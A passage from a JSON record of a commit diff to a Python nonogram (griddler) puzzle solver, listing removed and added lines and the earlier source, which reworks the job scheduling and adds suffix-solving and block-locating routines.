self.blx_x[idx])\n \n-    def init_jobs(self):\n-        jobs = {}\n-        for i in range(self.n):\n-            jobs[(0, i, False)] = 100 \/ self.weight(self.sums[0][i])\n-            jobs[(0, i, True)] = 1 \/ self.weight(self.sums[0][i])\n+    def solve_line(self, line_data, line_blx):\n+        if (line_data != 0).all():\n+            return\n \n-        for j in range(self.m):\n-            jobs[(1, j, False)] = 100 \/ self.weight(self.sums[1][j])\n-            jobs[(1, j, True)] = 1 \/ self.weight(self.sums[1][j])\n-        return jobs\n+        (a_idx, a_blx) = self.pfx(line_data, line_blx)\n+        (z_idx, z_blx) = self.sfx(line_data, line_blx)\n+        if a_blx >= z_blx:\n+            if a_idx < z_idx:\n+                self.update(line_data, 2, a_idx, z_idx - a_idx)\n+            return\n+        if a_idx >= z_idx:\n+            return\n \n-    @staticmethod\n-    def weight(s):\n-        return math.pow(2, s + 1)\n+        if not line_data[a_idx:z_idx].any():\n+            self.use_bf = False\n \n-    def print(self):\n-        for i in range(self.n):\n-            print(''.join({0: '___', 1: 'XXX', 2: '   '}.get(self.data[i, j]) for j in range(self.m)))\n-        print()\n+        self.freedom_solve(line_data, line_blx, a_idx, z_idx, a_blx, z_blx)\n \n-    def update(self, old_line, new_value, a_idx, n_idx, other_is_row):\n+        if self.use_bf:\n+            located_blx = self.locate_blx(line_data, line_blx, a_idx, z_idx, a_blx, z_blx)\n+            if len(located_blx) > 0:\n+                for idx, blx in located_blx.items():\n+                    self.bf(line_data, line_blx, a_idx, idx - 1, a_blx, blx)\n+                    self.bf(line_data, line_blx, idx + line_blx[blx], z_idx, blx + 1, z_blx)\n+            else:\n+                self.bf(line_data, line_blx, a_idx, z_idx, a_blx, z_blx)\n+\n+    def update(self, old_line, new_value, a_idx, n_idx):\n         if n_idx < 0 or a_idx + n_idx > len(old_line):\n             raise Exception(\"Invalid\")\n         if n_idx == 0:\n","add":81,"remove":33,"filename":"\/griddler.py","badparts":["TWO = np.array([2])","        self.sums = [np.zeros(self.n), np.zeros(self.m)]","    def solve(self):","        if sum(sum(self.blx_x, [])) != sum(sum(self.blx_y, [])):","            raise Exception(\"Sum mismatch\")","            self.max_combination *= 10","        self.jobs = self.init_jobs()","        while len(self.jobs) > 0:","            max_key = max(self.jobs, key=self.jobs.get)","            if self.jobs[max_key] <= 0:","                break","            self.jobs[max_key] = 0","            (is_col, idx, use_brute_force) = max_key","                self.solve_line(self.data[:, idx], self.blx_y[idx], 0, use_brute_force)","                self.solve_line(self.data[idx, :], self.blx_x[idx], 1, use_brute_force)","    def init_jobs(self):","        jobs = {}","        for i in range(self.n):","            jobs[(0, i, False)] = 100 \/ self.weight(self.sums[0][i])","            jobs[(0, i, True)] = 1 \/ self.weight(self.sums[0][i])","        for j in range(self.m):","            jobs[(1, j, False)] = 100 \/ self.weight(self.sums[1][j])","            jobs[(1, j, True)] = 1 \/ self.weight(self.sums[1][j])","        return jobs","    @staticmethod","    def weight(s):","        return math.pow(2, s + 1)","    def print(self):","        for i in range(self.n):","            print(''.join({0: '___', 1: 'XXX', 2: '   '}.get(self.data[i, j]) for j in range(self.m)))","        print()","    def update(self, old_line, new_value, a_idx, n_idx, other_is_row):"],"goodparts":["import copy","        if sum(sum(self.blx_x, [])) != sum(sum(self.blx_y, [])):","            raise Exception(\"Sum mismatch\")","        self.bf_jobs = {}","        self.future_bf_jobs = {}","        self.empty_jobs = self.empty_jobs(self.n, self.m)","        self.init_jobs(True)","        self.key = (-1, -1)","        self.use_bf = False","    def print(self):","        for i in range(self.n):","            print(''.join({0: '___', 1: 'XXX', 2: '   '}.get(self.data[i, j]) for j in range(self.m)))","        print()","    @staticmethod","    def empty_jobs(n, m):","        res = {}","        for i in range(n):","            res[(0, i)] = 0","        for j in range(m):","            res[(1, j)] = 0","        return res","    def init_jobs(self, first_time):","        self.bf_jobs = self.future_bf_jobs","        self.future_bf_jobs = copy.deepcopy(self.empty_jobs)","        if first_time:","            for i in range(self.n):","                self.jobs[(0, i)] = 1","                self.future_bf_jobs[(0, i)] = 0","                self.bf_jobs[(0, i)] = 0","            for j in range(self.m):","                self.jobs[(1, j)] = 1","                self.future_bf_jobs[(1, j)] = 0","                self.bf_jobs[(1, j)] = 0","    def solve(self):","            self.max_combination *= 1.5","        self.init_jobs(False)","        while True:","            self.use_bf = False","            self.key = max(self.jobs, key=self.jobs.get)","            if self.jobs[self.key] > 0:","                self.jobs[self.key] = 0","            else:","                self.use_bf = True","                self.key = max(self.bf_jobs, key=self.bf_jobs.get)","                if self.bf_jobs[self.key] > 0:","                    self.bf_jobs[self.key] = 0","                else:","                    return","            (is_col, idx) = self.key","                self.solve_line(self.data[:, idx], self.blx_y[idx])","                self.solve_line(self.data[idx, :], self.blx_x[idx])","    def solve_line(self, line_data, line_blx):","        if (line_data != 0).all():","            return","        (a_idx, a_blx) = self.pfx(line_data, line_blx)","        (z_idx, z_blx) = self.sfx(line_data, line_blx)","        if a_blx >= z_blx:","            if a_idx < z_idx:","                self.update(line_data, 2, a_idx, z_idx - a_idx)","            return","        if a_idx >= z_idx:","            return","        if not line_data[a_idx:z_idx].any():","            self.use_bf = False","        self.freedom_solve(line_data, line_blx, a_idx, z_idx, a_blx, z_blx)","        if self.use_bf:","            located_blx = self.locate_blx(line_data, line_blx, a_idx, z_idx, a_blx, z_blx)","            if len(located_blx) > 0:","                for idx, blx in located_blx.items():","                    self.bf(line_data, line_blx, a_idx, idx - 1, a_blx, blx)","                    self.bf(line_data, line_blx, idx + line_blx[blx], z_idx, blx + 1, z_blx)","            else:","                self.bf(line_data, line_blx, a_idx, z_idx, a_blx, z_blx)","    def update(self, old_line, new_value, a_idx, n_idx):"]},{"diff":"\n         diffs = list(np.nonzero(old_line[a_idx:a_idx + n_idx] != new_value)[0])\n         if len(diffs) > 0:\n             old_line[a_idx:a_idx + n_idx] = new_value\n+            # self.bf_jobs[self.key] += 1\n             for idx in diffs:\n-                self.sums[other_is_row][a_idx + idx] += 1\n-                self.jobs[(other_is_row, a_idx + idx, False)] += 100 \/ self.weight(self.sums[other_is_row][a_idx + idx])\n-                self.jobs[(other_is_row, a_idx + idx, True)] += 1 \/ self.weight(self.sums[other_is_row][a_idx + idx])\n+                self.jobs[(1 - self.key[0], a_idx + idx)] += 1\n+                self.bf_jobs[(1 - self.key[0], a_idx + idx)] += 1\n \n-    @staticmethod\n-    def update_soft(old_line, agg_line, new_line, a_idx, n_idx, first_time):\n-        if np.logical_and(old_line[a_idx:a_idx+n_idx] != 0, old_line[a_idx:a_idx+n_idx] != new_line[:n_idx]).any():\n-            return True  # still first time\n+    def pfx(self, line_data, line_blx):\n+        return self.pfx_internal(line_data, line_blx, 0, 0)\n \n-        if first_time:\n-            agg_line[:] = new_line[:]\n-        else:\n-            agg_line[new_line != agg_line] = 0\n-        return False\n-\n-    def solve_line(self, line_data, line_blx, other_is_row, use_brute_force):\n-        grayed = np.nonzero(line_data == 0)\n-        if len(grayed[0]) == 0:\n-            return\n-\n-        (a_idx, a_blx) = self.pfx(line_data, line_blx, other_is_row)\n-        (z_idx, z_blx) = self.sfx(line_data, line_blx, other_is_row)\n-        if a_blx >= z_blx:\n-            if a_idx < z_idx:\n-                self.update(line_data, 2, a_idx, z_idx - a_idx, other_is_row)\n-            return\n-        if a_idx >= z_idx:\n-            return\n-\n-        self.freedom_solve(line_data, line_blx, a_idx, z_idx, a_blx, z_blx, other_is_row)\n-        if use_brute_force:\n-            self.brute_force(line_data, line_blx, a_idx, z_idx, a_blx, z_blx, other_is_row)\n-\n-    def pfx(self, line_data, line_blx, other_is_row):\n-        return self.pfx_internal(line_data, line_blx, 0, 0, other_is_row)\n-\n-    def sfx(self, line_data, line_blx, other_is_row):\n-        (z_idx_inv, z_blx_inv) = self.pfx_internal(np.flip(line_data), list(reversed(line_blx)), 0, 0, other_is_row)\n-        return len(line_data) - z_idx_inv, len(line_blx) - z_blx_inv\n-\n-    def pfx_internal(self, line_data, line_blx, a_idx, a_blx, other_is_row):\n+    def pfx_internal(self, line_data, line_blx, a_idx, a_blx):\n         n_idx = len(line_data) - a_idx\n         n_blx = len(line_blx) - a_blx\n \n         if n_idx == 0:  # no line data\n             return a_idx, a_blx\n-    \n+\n         if n_blx == 0:  # no more blx\n-            self.update(line_data, 2, a_idx, n_idx, other_is_row)\n+            self.update(line_data, 2, a_idx, n_idx)\n             return a_idx+n_idx, a_blx+n_blx\n \n         current_blx = line_blx[a_blx]\n \n         if line_data[a_idx] == 1:\n-            self.update(line_data, 1, a_idx, current_blx, other_is_row)\n+            self.update(line_data, 1, a_idx, current_blx)\n             a_idx += current_blx\n             a_blx += 1\n             if len(line_data) > a_idx:\n-                self.update(line_data, 2, a_idx, 1, other_is_row)\n+                self.update(line_data, 2, a_idx, 1)\n                 a_idx += 1\n-            return self.pfx_internal(line_data, line_blx, a_idx, a_blx, other_is_row)\n+            return self.pfx_internal(line_data, line_blx, a_idx, a_blx)\n         elif line_data[a_idx] == 2:\n             maybe_black = np.nonzero(line_data[a_idx:] != 2)\n             if len(maybe_black[0]) > 0:\n                 a_idx = maybe_black[0][0] + a_idx\n-                return self.pfx_internal(line_data, line_blx, a_idx, a_blx, other_is_row)\n+                return self.pfx_internal(line_data, line_blx, a_idx, a_blx)\n             else:\n                 raise Exception(\"Shouldn't get here\")\n         else:\n","add":12,"remove":45,"filename":"\/griddler.py","badparts":["                self.sums[other_is_row][a_idx + idx] += 1","                self.jobs[(other_is_row, a_idx + idx, False)] += 100 \/ self.weight(self.sums[other_is_row][a_idx + idx])","                self.jobs[(other_is_row, a_idx + idx, True)] += 1 \/ self.weight(self.sums[other_is_row][a_idx + idx])","    @staticmethod","    def update_soft(old_line, agg_line, new_line, a_idx, n_idx, first_time):","        if np.logical_and(old_line[a_idx:a_idx+n_idx] != 0, old_line[a_idx:a_idx+n_idx] != new_line[:n_idx]).any():","            return True  # still first time","        if first_time:","            agg_line[:] = new_line[:]","        else:","            agg_line[new_line != agg_line] = 0","        return False","    def solve_line(self, line_data, line_blx, other_is_row, use_brute_force):","        grayed = np.nonzero(line_data == 0)","        if len(grayed[0]) == 0:","            return","        (a_idx, a_blx) = self.pfx(line_data, line_blx, other_is_row)","        (z_idx, z_blx) = self.sfx(line_data, line_blx, other_is_row)","        if a_blx >= z_blx:","            if a_idx < z_idx:","                self.update(line_data, 2, a_idx, z_idx - a_idx, other_is_row)","            return","        if a_idx >= z_idx:","            return","        self.freedom_solve(line_data, line_blx, a_idx, z_idx, a_blx, z_blx, other_is_row)","        if use_brute_force:","            self.brute_force(line_data, line_blx, a_idx, z_idx, a_blx, z_blx, other_is_row)","    def pfx(self, line_data, line_blx, other_is_row):","        return self.pfx_internal(line_data, line_blx, 0, 0, other_is_row)","    def sfx(self, line_data, line_blx, other_is_row):","        (z_idx_inv, z_blx_inv) = self.pfx_internal(np.flip(line_data), list(reversed(line_blx)), 0, 0, other_is_row)","        return len(line_data) - z_idx_inv, len(line_blx) - z_blx_inv","    def pfx_internal(self, line_data, line_blx, a_idx, a_blx, other_is_row):","            self.update(line_data, 2, a_idx, n_idx, other_is_row)","            self.update(line_data, 1, a_idx, current_blx, other_is_row)","                self.update(line_data, 2, a_idx, 1, other_is_row)","            return self.pfx_internal(line_data, line_blx, a_idx, a_blx, other_is_row)","                return self.pfx_internal(line_data, line_blx, a_idx, a_blx, other_is_row)"],"goodparts":["                self.jobs[(1 - self.key[0], a_idx + idx)] += 1","                self.bf_jobs[(1 - self.key[0], a_idx + idx)] += 1","    def pfx(self, line_data, line_blx):","        return self.pfx_internal(line_data, line_blx, 0, 0)","    def pfx_internal(self, line_data, line_blx, a_idx, a_blx):","            self.update(line_data, 2, a_idx, n_idx)","            self.update(line_data, 1, a_idx, current_blx)","                self.update(line_data, 2, a_idx, 1)","            return self.pfx_internal(line_data, line_blx, a_idx, a_blx)","                return self.pfx_internal(line_data, line_blx, a_idx, a_blx)"]},{"diff":"\n                 first_blacked = blacked[0][0]\n                 overflow = current_blx - first_blacked\n                 if overflow > 0:\n-                    self.update(line_data, 1, a_idx + first_blacked, overflow, other_is_row)\n+                    self.update(line_data, 1, a_idx + first_blacked, overflow)\n             return a_idx, a_blx\n \n-    def freedom_solve(self, line_data, line_blx, a_idx, z_idx, a_blx, z_blx, other_is_row):\n+    def sfx(self, line_data, line_blx):\n+        return self.sfx_internal(line_data, line_blx, len(line_data), len(line_blx))\n+\n+    def sfx_internal(self, line_data, line_blx, z_idx, z_blx):\n+        n_idx = z_idx\n+        n_blx = z_blx\n+\n+        if n_idx == 0:  # no line data\n+            return z_idx, z_blx\n+\n+        if n_blx == 0:  # no more blx\n+            self.update(line_data, 2, z_idx - n_idx, n_idx)\n+            return z_idx - n_idx, z_blx - n_blx\n+\n+        current_blx = line_blx[z_blx - 1]\n+\n+        if line_data[z_idx - 1] == 1:\n+            self.update(line_data, 1, z_idx - current_blx, current_blx)\n+            z_idx -= current_blx\n+            z_blx -= 1\n+            if 0 < z_idx:\n+                self.update(line_data, 2, z_idx - 1, 1)\n+                z_idx -= 1\n+            return self.sfx_internal(line_data, line_blx, z_idx, z_blx)\n+        elif line_data[z_idx - 1] == 2:\n+            maybe_black = np.nonzero(line_data[:z_idx] != 2)\n+            if len(maybe_black[0]) > 0:\n+                z_idx = maybe_black[0][-1] + 1\n+                return self.sfx_internal(line_data, line_blx, z_idx, z_blx)\n+            else:\n+                raise Exception(\"Shouldn't get here\")\n+        else:\n+            blacked = np.nonzero(line_data[z_idx - current_blx:z_idx] == 1)\n+            if len(blacked[0]) > 0 and 0 <= blacked[0][-1] < current_blx:\n+                last_blacked = blacked[0][-1]\n+                if last_blacked > 0:\n+                    self.update(line_data, 1, z_idx - current_blx, last_blacked + 1)\n+            return z_idx, z_blx\n+\n+    def freedom_solve(self, line_data, line_blx, a_idx, z_idx, a_blx, z_blx):\n         n_idx = z_idx - a_idx\n         freedom = n_idx - sum(blx + 1 for blx in line_blx[a_blx:z_blx]) + 1\n         if freedom < max(line_blx[a_blx:z_blx]):\n","add":41,"remove":2,"filename":"\/griddler.py","badparts":["                    self.update(line_data, 1, a_idx + first_blacked, overflow, other_is_row)","    def freedom_solve(self, line_data, line_blx, a_idx, z_idx, a_blx, z_blx, other_is_row):"],"goodparts":["                    self.update(line_data, 1, a_idx + first_blacked, overflow)","    def sfx(self, line_data, line_blx):","        return self.sfx_internal(line_data, line_blx, len(line_data), len(line_blx))","    def sfx_internal(self, line_data, line_blx, z_idx, z_blx):","        n_idx = z_idx","        n_blx = z_blx","        if n_idx == 0:  # no line data","            return z_idx, z_blx","        if n_blx == 0:  # no more blx","            self.update(line_data, 2, z_idx - n_idx, n_idx)","            return z_idx - n_idx, z_blx - n_blx","        current_blx = line_blx[z_blx - 1]","        if line_data[z_idx - 1] == 1:","            self.update(line_data, 1, z_idx - current_blx, current_blx)","            z_idx -= current_blx","            z_blx -= 1","            if 0 < z_idx:","                self.update(line_data, 2, z_idx - 1, 1)","                z_idx -= 1","            return self.sfx_internal(line_data, line_blx, z_idx, z_blx)","        elif line_data[z_idx - 1] == 2:","            maybe_black = np.nonzero(line_data[:z_idx] != 2)","            if len(maybe_black[0]) > 0:","                z_idx = maybe_black[0][-1] + 1","                return self.sfx_internal(line_data, line_blx, z_idx, z_blx)","            else:","                raise Exception(\"Shouldn't get here\")","        else:","            blacked = np.nonzero(line_data[z_idx - current_blx:z_idx] == 1)","            if len(blacked[0]) > 0 and 0 <= blacked[0][-1] < current_blx:","                last_blacked = blacked[0][-1]","                if last_blacked > 0:","                    self.update(line_data, 1, z_idx - current_blx, last_blacked + 1)","            return z_idx, z_blx","    def freedom_solve(self, line_data, line_blx, a_idx, z_idx, a_blx, z_blx):"]},{"diff":"\n             for blx in line_blx[a_blx:z_blx]:\n                 blacks = blx - freedom\n                 if blacks > 0:\n-                    self.update(line_data, 1, idx + freedom, blacks, other_is_row)\n+                    self.update(line_data, 1, idx + freedom, blacks)\n                 idx = idx + blx + 1\n \n-    def brute_force(self, line_data, line_blx, a_idx, z_idx, a_blx, z_blx, other_is_row):\n+    @staticmethod\n+    def locate_blx(line_data, line_blx, a_idx, z_idx, a_blx, z_blx):\n+        empty = False\n+        white = False\n+        blacks = 0\n+        suspects = {}\n+        located_blocks = {}\n+        for idx in range(a_idx, z_idx):\n+            if line_data[idx] == 0:\n+                empty = True\n+                white = False\n+                blacks = 0\n+            elif empty and not white and line_data[idx] == 2:\n+                empty = False\n+                white = True\n+                blacks = 0\n+            elif white and blacks == 0 and line_data[idx] == 1:\n+                blacks = 1\n+                white = False\n+                empty = False\n+            elif blacks > 0 and line_data[idx] == 1:\n+                blacks += 1\n+                white = False\n+                empty = False\n+            elif blacks > 0 and line_data[idx] == 2:\n+                suspects[idx - blacks] = blacks\n+                blacks = 0\n+                empty = False\n+                white = True\n+\n+        if len(suspects) > 0:\n+            for idx, blx in suspects.items():\n+                if blx in line_blx[a_blx:z_blx]:\n+                    if line_blx[a_blx:z_blx].count(blx) == 1:\n+                        blx_idx = line_blx[a_blx:z_blx].index(blx)\n+                        located_blocks[idx] = a_blx + blx_idx\n+        return located_blocks\n+\n+    def bf(self, line_data, line_blx, a_idx, z_idx, a_blx, z_blx):\n         n_idx = z_idx - a_idx\n         n_blx = z_blx - a_blx\n         freedom = n_idx - sum(blx + 1 for blx in line_blx[a_blx:z_blx]) + 1\n         possibilities = math.comb(freedom + n_blx, n_blx)\n         if possibilities > self.max_combination:\n+            self.future_bf_jobs[self.key] += 1\n             return\n \n         agg_line = np.zeros(n_idx)\n","add":41,"remove":2,"filename":"\/griddler.py","badparts":["                    self.update(line_data, 1, idx + freedom, blacks, other_is_row)","    def brute_force(self, line_data, line_blx, a_idx, z_idx, a_blx, z_blx, other_is_row):"],"goodparts":["                    self.update(line_data, 1, idx + freedom, blacks)","    @staticmethod","    def locate_blx(line_data, line_blx, a_idx, z_idx, a_blx, z_blx):","        empty = False","        white = False","        blacks = 0","        suspects = {}","        located_blocks = {}","        for idx in range(a_idx, z_idx):","            if line_data[idx] == 0:","                empty = True","                white = False","                blacks = 0","            elif empty and not white and line_data[idx] == 2:","                empty = False","                white = True","                blacks = 0","            elif white and blacks == 0 and line_data[idx] == 1:","                blacks = 1","                white = False","                empty = False","            elif blacks > 0 and line_data[idx] == 1:","                blacks += 1","                white = False","                empty = False","            elif blacks > 0 and line_data[idx] == 2:","                suspects[idx - blacks] = blacks","                blacks = 0","                empty = False","                white = True","        if len(suspects) > 0:","            for idx, blx in suspects.items():","                if blx in line_blx[a_blx:z_blx]:","                    if line_blx[a_blx:z_blx].count(blx) == 1:","                        blx_idx = line_blx[a_blx:z_blx].index(blx)","                        located_blocks[idx] = a_blx + blx_idx","        return located_blocks","    def bf(self, line_data, line_blx, a_idx, z_idx, a_blx, z_blx):","            self.future_bf_jobs[self.key] += 1"]},{"diff":"\n             for i in range(freedom + n_blx):\n                 if i in combo:\n                     blx_len = line_blx[blx]\n-                    new_line[idx:idx + blx_len] = np.ones(blx_len)\n+                    new_line[idx:idx + blx_len].fill(1)\n                     idx += blx_len\n                     blx += 1\n                 new_line[idx] = 2\n                 idx += 1\n             new_line = new_line[:-1]\n             first_time = self.update_soft(line_data, agg_line, new_line, a_idx, n_idx, first_time) and first_time\n-            if not first_time and not agg_line.any():\n-                break\n+            if not first_time and (agg_line == line_data[a_idx:z_idx]).all():\n+                return\n         if first_time:\n             raise Exception(\"Dead end\")\n \n-        return self.update(line_data, agg_line, a_idx, n_idx, other_is_row)\n+        self.update(line_data, agg_line, a_idx, n_idx)\n+\n+    @staticmethod\n+    def update_soft(old_line, agg_line, new_line, a_idx, n_idx, first_time):\n+        if np.logical_and(old_line[a_idx:a_idx + n_idx] != 0, old_line[a_idx:a_idx + n_idx] != new_line).any():\n+            return True  # still first time\n+\n+        if first_time:\n+            agg_line[:] = new_line\n+        else:\n+            agg_line[new_line != agg_line] = 0\n+        return False\n+\n \n def test():\n     blx_x = [[1, 1], [1, 16], [19], [9], [2, 4],\n","add":16,"remove":4,"filename":"\/griddler.py","badparts":["                    new_line[idx:idx + blx_len] = np.ones(blx_len)","            if not first_time and not agg_line.any():","                break","        return self.update(line_data, agg_line, a_idx, n_idx, other_is_row)"],"goodparts":["                    new_line[idx:idx + blx_len].fill(1)","            if not first_time and (agg_line == line_data[a_idx:z_idx]).all():","                return","        self.update(line_data, agg_line, a_idx, n_idx)","    @staticmethod","    def update_soft(old_line, agg_line, new_line, a_idx, n_idx, first_time):","        if np.logical_and(old_line[a_idx:a_idx + n_idx] != 0, old_line[a_idx:a_idx + n_idx] != new_line).any():","            return True  # still first time","        if first_time:","            agg_line[:] = new_line","        else:","            agg_line[new_line != agg_line] = 0","        return False"]}],"source":"\nimport time import numpy as np import math import random from itertools import combinations TWO=np.array([2]) class Griddler: def __init__(self, blx_x, blx_y): self.blx_x=blx_x self.blx_y=blx_y self.n=len(blx_x) self.m=len(blx_y) self.data=np.zeros([self.n, self.m]) self.sums=[np.zeros(self.n), np.zeros(self.m)] self.max_combination=10 self.jobs={} def solve(self): if sum(sum(self.blx_x,[])) !=sum(sum(self.blx_y,[])): raise Exception(\"Sum mismatch\") while(self.data==0).any(): print(f\"Starting. max_combinations={self.max_combination}\") self.solve_loop() self.max_combination *=10 def solve_loop(self): self.jobs=self.init_jobs() while len(self.jobs) > 0: max_key=max(self.jobs, key=self.jobs.get) if self.jobs[max_key] <=0: break self.jobs[max_key]=0 (is_col, idx, use_brute_force)=max_key if is_col: self.solve_line(self.data[:, idx], self.blx_y[idx], 0, use_brute_force) else: self.solve_line(self.data[idx,:], self.blx_x[idx], 1, use_brute_force) def init_jobs(self): jobs={} for i in range(self.n): jobs[(0, i, False)]=100 \/ self.weight(self.sums[0][i]) jobs[(0, i, True)]=1 \/ self.weight(self.sums[0][i]) for j in range(self.m): jobs[(1, j, False)]=100 \/ self.weight(self.sums[1][j]) jobs[(1, j, True)]=1 \/ self.weight(self.sums[1][j]) return jobs @staticmethod def weight(s): return math.pow(2, s +1) def print(self): for i in range(self.n): print(''.join({0: '___', 1: 'XXX', 2: ' '}.get(self.data[i, j]) for j in range(self.m))) print() def update(self, old_line, new_value, a_idx, n_idx, other_is_row): if n_idx < 0 or a_idx +n_idx > len(old_line): raise Exception(\"Invalid\") if n_idx==0: return diffs=list(np.nonzero(old_line[a_idx:a_idx +n_idx] !=new_value)[0]) if len(diffs) > 0: old_line[a_idx:a_idx +n_idx]=new_value for idx in diffs: self.sums[other_is_row][a_idx +idx] +=1 self.jobs[(other_is_row, a_idx +idx, False)] +=100 \/ self.weight(self.sums[other_is_row][a_idx +idx]) self.jobs[(other_is_row, a_idx +idx, True)] +=1 \/ self.weight(self.sums[other_is_row][a_idx +idx]) @staticmethod def update_soft(old_line, agg_line, new_line, a_idx, n_idx, first_time): if np.logical_and(old_line[a_idx:a_idx+n_idx] !=0, old_line[a_idx:a_idx+n_idx] !=new_line[:n_idx]).any(): return True if first_time: agg_line[:]=new_line[:] else: agg_line[new_line !=agg_line]=0 return False def solve_line(self, line_data, line_blx, other_is_row, use_brute_force): grayed=np.nonzero(line_data==0) if len(grayed[0])==0: return (a_idx, a_blx)=self.pfx(line_data, line_blx, other_is_row) (z_idx, z_blx)=self.sfx(line_data, line_blx, other_is_row) if a_blx >=z_blx: if a_idx < z_idx: self.update(line_data, 2, a_idx, z_idx -a_idx, other_is_row) return if a_idx >=z_idx: return self.freedom_solve(line_data, line_blx, a_idx, z_idx, a_blx, z_blx, other_is_row) if use_brute_force: self.brute_force(line_data, line_blx, a_idx, z_idx, a_blx, z_blx, other_is_row) def pfx(self, line_data, line_blx, other_is_row): return self.pfx_internal(line_data, line_blx, 0, 0, other_is_row) def sfx(self, line_data, line_blx, other_is_row): (z_idx_inv, z_blx_inv)=self.pfx_internal(np.flip(line_data), list(reversed(line_blx)), 0, 0, other_is_row) return len(line_data) -z_idx_inv, len(line_blx) -z_blx_inv def pfx_internal(self, line_data, line_blx, a_idx, a_blx, other_is_row): n_idx=len(line_data) -a_idx n_blx=len(line_blx) -a_blx if n_idx==0: return a_idx, a_blx if n_blx==0: self.update(line_data, 2, a_idx, n_idx, other_is_row) return a_idx+n_idx, a_blx+n_blx current_blx=line_blx[a_blx] if line_data[a_idx]==1: self.update(line_data, 1, a_idx, current_blx, other_is_row) a_idx +=current_blx a_blx +=1 if len(line_data) > a_idx: self.update(line_data, 2, a_idx, 1, other_is_row) a_idx +=1 return self.pfx_internal(line_data, line_blx, a_idx, a_blx, other_is_row) elif line_data[a_idx]==2: maybe_black=np.nonzero(line_data[a_idx:] !=2) if len(maybe_black[0]) > 0: a_idx=maybe_black[0][0] +a_idx return self.pfx_internal(line_data, line_blx, a_idx, a_blx, other_is_row) else: raise Exception(\"Shouldn't get here\") else: blacked=np.nonzero(line_data[a_idx:a_idx +current_blx]==1) if len(blacked[0]) > 0 and 0 <=blacked[0][0] < current_blx: first_blacked=blacked[0][0] overflow=current_blx -first_blacked if overflow > 0: self.update(line_data, 1, a_idx +first_blacked, overflow, other_is_row) return a_idx, a_blx def freedom_solve(self, line_data, line_blx, a_idx, z_idx, a_blx, z_blx, other_is_row): n_idx=z_idx -a_idx freedom=n_idx -sum(blx +1 for blx in line_blx[a_blx:z_blx]) +1 if freedom < max(line_blx[a_blx:z_blx]): idx=a_idx for blx in line_blx[a_blx:z_blx]: blacks=blx -freedom if blacks > 0: self.update(line_data, 1, idx +freedom, blacks, other_is_row) idx=idx +blx +1 def brute_force(self, line_data, line_blx, a_idx, z_idx, a_blx, z_blx, other_is_row): n_idx=z_idx -a_idx n_blx=z_blx -a_blx freedom=n_idx -sum(blx +1 for blx in line_blx[a_blx:z_blx]) +1 possibilities=math.comb(freedom +n_blx, n_blx) if possibilities > self.max_combination: return agg_line=np.zeros(n_idx) first_time=True list_of_combinations=combinations(range(freedom +n_blx), n_blx) list_of_combinations=list(list_of_combinations) random.shuffle(list_of_combinations) for combo in list_of_combinations: new_line=np.zeros(n_idx +1) idx=0 blx=a_blx for i in range(freedom +n_blx): if i in combo: blx_len=line_blx[blx] new_line[idx:idx +blx_len]=np.ones(blx_len) idx +=blx_len blx +=1 new_line[idx]=2 idx +=1 new_line=new_line[:-1] first_time=self.update_soft(line_data, agg_line, new_line, a_idx, n_idx, first_time) and first_time if not first_time and not agg_line.any(): break if first_time: raise Exception(\"Dead end\") return self.update(line_data, agg_line, a_idx, n_idx, other_is_row) def test(): blx_x=[[1, 1],[1, 16],[19],[9],[2, 4], [3, 10],[13],[16],[1, 19],[24], [2, 3, 3, 8],[3, 3, 3, 1, 7],[1, 4, 2, 2, 7],[1, 3, 7],[1, 1, 1, 7], [4, 1, 7],[1, 8],[1, 2, 7],[2, 6],[3, 1, 5], [1, 1, 5],[2, 11],[5, 6, 1],[8, 1],[3, 1], [3, 1],[4, 5],[4, 2, 2],[3, 3, 1],[4, 2]] blx_y=[[1, 1],[1, 1, 3, 3],[2, 1, 1, 1, 5],[1, 1, 1, 1, 6],[1, 3, 4, 3, 5], [4, 4, 6, 4],[1, 3, 2, 1, 1, 1, 3],[3, 2, 2, 1, 1, 1],[3, 5, 1],[3, 5, 1], [3, 4, 1],[3, 3, 2, 1],[3, 7, 1],[2, 6, 2],[2, 5, 3, 1, 4], [2, 5, 2, 1, 1, 1],[2, 5, 4, 1, 1, 2],[2, 6, 3, 1, 1],[2, 17, 2],[2, 17, 2], [2, 17, 1],[2, 17, 1],[2, 17, 1],[3, 14, 7],[1, 10, 2]] t=time.time() Griddler(blx_x, blx_y).solve() print(time.time() -t) test() ","sourceWithComments":"import time\nimport numpy as np\nimport math\nimport random\nfrom itertools import combinations\n\nTWO = np.array([2])\n\n\nclass Griddler:\n    def __init__(self, blx_x, blx_y):\n        self.blx_x = blx_x\n        self.blx_y = blx_y\n        self.n = len(blx_x)\n        self.m = len(blx_y)\n        self.data = np.zeros([self.n, self.m])\n        self.sums = [np.zeros(self.n), np.zeros(self.m)]\n        self.max_combination = 10\n        self.jobs = {}\n\n    def solve(self):\n        if sum(sum(self.blx_x, [])) != sum(sum(self.blx_y, [])):\n            raise Exception(\"Sum mismatch\")\n\n        while (self.data == 0).any():\n            print(f\"Starting. max_combinations={self.max_combination}\")\n            self.solve_loop()\n            # self.print()\n            self.max_combination *= 10\n\n    def solve_loop(self):\n        self.jobs = self.init_jobs()\n        while len(self.jobs) > 0:\n            max_key = max(self.jobs, key=self.jobs.get)\n            if self.jobs[max_key] <= 0:\n                break\n\n            self.jobs[max_key] = 0\n            (is_col, idx, use_brute_force) = max_key\n\n            if is_col:\n                self.solve_line(self.data[:, idx], self.blx_y[idx], 0, use_brute_force)\n            else:\n                self.solve_line(self.data[idx, :], self.blx_x[idx], 1, use_brute_force)\n\n    def init_jobs(self):\n        jobs = {}\n        for i in range(self.n):\n            jobs[(0, i, False)] = 100 \/ self.weight(self.sums[0][i])\n            jobs[(0, i, True)] = 1 \/ self.weight(self.sums[0][i])\n\n        for j in range(self.m):\n            jobs[(1, j, False)] = 100 \/ self.weight(self.sums[1][j])\n            jobs[(1, j, True)] = 1 \/ self.weight(self.sums[1][j])\n        return jobs\n\n    @staticmethod\n    def weight(s):\n        return math.pow(2, s + 1)\n\n    def print(self):\n        for i in range(self.n):\n            print(''.join({0: '___', 1: 'XXX', 2: '   '}.get(self.data[i, j]) for j in range(self.m)))\n        print()\n\n    def update(self, old_line, new_value, a_idx, n_idx, other_is_row):\n        if n_idx < 0 or a_idx + n_idx > len(old_line):\n            raise Exception(\"Invalid\")\n        if n_idx == 0:\n            return\n        diffs = list(np.nonzero(old_line[a_idx:a_idx + n_idx] != new_value)[0])\n        if len(diffs) > 0:\n            old_line[a_idx:a_idx + n_idx] = new_value\n            for idx in diffs:\n                